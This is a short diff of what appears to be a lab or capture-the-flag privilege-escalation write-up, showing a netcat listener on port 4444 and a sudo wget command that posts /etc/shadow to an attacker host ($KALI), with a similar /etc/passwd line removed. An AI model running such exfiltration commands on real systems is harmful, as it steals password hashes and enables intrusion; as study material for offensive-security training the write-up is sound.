@@ -59,7 +59,6 @@ nc -lvnp 4444
 
 ```
 sudo -u root /usr/bin/wget --post-file=/etc/shadow $KALI:4444
-sudo -u root /usr/bin/wget --post-file=/etc/passwd $KALI:4444
 ```
 
 
